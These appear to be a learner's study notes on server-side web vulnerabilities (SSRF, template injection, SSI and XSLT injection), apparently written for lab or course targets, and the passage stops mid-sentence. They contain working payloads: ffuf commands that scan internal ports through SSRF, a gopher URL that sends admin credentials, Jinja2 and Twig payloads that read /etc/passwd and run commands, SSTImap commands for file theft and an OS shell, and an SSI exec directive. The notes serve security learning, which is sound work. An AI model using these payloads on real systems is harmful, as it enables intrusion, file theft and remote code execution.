Classes of Server-side Vulnerabilities : 
- Server-Side Request Forgery (SSRF) - Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.

- Server-Side Template Injection (SSTI) - Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a Server-Side Template Injection vulnerability can occur. SSTI can lead to various security risks, including data leakage and even full server compromise via remote code execution.

- Server-Side Includes (SSI) Injection - Similar to server-side templates, server-side includes (SSI) can be used to generate HTML responses dynamically. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into HTML files. For instance, SSI can be used to include content that is present in all HTML pages, such as headers or footers. When an attacker can inject commands into the SSI directives, Server-Side Includes (SSI) Injection can occur. SSI injection can lead to data leakage or even remote code execution.

- eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection - XSLT (Extensible Stylesheet Language Transformations) server-side injection is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. XSLT is a language used to transform XML documents into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically. In the context of XSLT server-side injection, attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.

URL Schemes for exploitation of SSRF : 
- `http://` and `https://`: These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network
- `file://`: This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI)
- `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases


Command to exploit SSRF :
- `ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -t 1000`

## Exploiting SSRF
**Accessing Restricted Endpoints** : `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -t 1000`

**Local File Inclusion (LFI)** : `file:///etc/passwd`

**gopher Protocol :**  If we don't have any way to send a POST Request with Login Credentials to the server, we can use this protocol to send the request : 
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

We can use this tool to generate the Gopher URLs : `https://github.com/tarunkant/Gopherus`

## Blind SSRF
If we don't get actual response from the server on exploitation but we receive a registered error. 

To check for Blind SSRF, just simply start the listener and enter the IP address to the Request and check for error messages, if you see it handling different message differently to gather info regarding the open PORTS.

Check for Open Ports using this command : `ffuf -w ./ports.txt -u http://<given_ip>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://<localhost_ip>:FUZZ/date=2024-01-01" -fr "Something went wrong"`

## Template Engines
A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses. An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are [Jinja](https://jinja.palletsprojects.com/en/3.1.x/) and [Twig](https://twig.symfony.com/).

## SSTI - Server Side Template Injection 
the following test string is commonly used to provoke an error message in a web application vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:

`${{<%[%'"}}%\.`

![[Pasted image 20250422180816.png]]
Check using this Diagram given, if it works then follow Green Arrow else follow Red Arrow.

## Information Disclosure using SSTI
To obtain the web application's configuration using SSTI : `{{ config.items() }}`

To dump all built-in functions : `{{ self.__init__.__globals__.__builtins__ }}`

To open a file : `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`

For remote code execution we can use : `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | In this command, it first imports the OS library and then runs the command 'id'.

To get information regarding the current template : `{{ _self }}`

he PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files : `{{ "/etc/passwd"|file_excerpt(1,-1) }}`

For Remote Code Execution (RCE) : `{{ ['id'] | filter('system') }}`

## Tools of the Trade 
**Installation Guide :**

```shell-session
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
```

Command to run the tool : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test`

 This command will download the file `/etc/passwd` to the local file system : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'`

This command executes the command we specify after `-s` flag : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id`

This command provides us with a Shell : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell`


## Server-Side Includes (SSI) Injection
Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`. However, web servers can be configured to support SSI directives in arbitrary file extensions. As such, we cannot conclusively conclude whether SSI is used only from the file extension.

## SSI Directives

SSI utilizes `directives` to add dynamically generated content to a static HTML page. These directives consist of the following components:

- `name`: the directive's name
- `parameter name`: one or more parameters
- `value`: one or more parameter values

An SSI directive has the following syntax:
```ssi
<!--#name param1="value1" param2="value" -->
```



- `<!--#printenv -->` : Prints the environment variable
- `<!--#config errmsg="Error!" -->` : Used to change the SSI configuration of a parameter
-  `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->`: This directive prints the value of any variable given in the var parameter. Multiple variables can be printed by specifying multiple var parameters. For instance, the following variables are supported:
	DOCUMENT_NAME: the current file's name
	DOCUMENT_URI: the current file's URI
	LAST_MODIFIED: timestamp of the last modification of the current file
	DATE_LOCAL: local server time
- `<!--#exec cmd="whoami" -->` : Used to execute the given commands
- `<!--#include virtual="index.html" -->` : Allows the inclusion of files present in the web root directory by specifying that in the `virtual` parameter.


## eXtensible Stylesheet Language Transformation (XSLT) Injection
- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```
```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
```
OUTPUT : 
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

**Additional XSL Elements :**
- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the `select` argument. Additionally, a sort order may be specified in the `order` argument
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the `test` argument.`
```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
```
OUTPUT:
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```


## Identifying XLST Injection
If anything provided in the text fields is reflected on the web page itself, we can simply check out XLST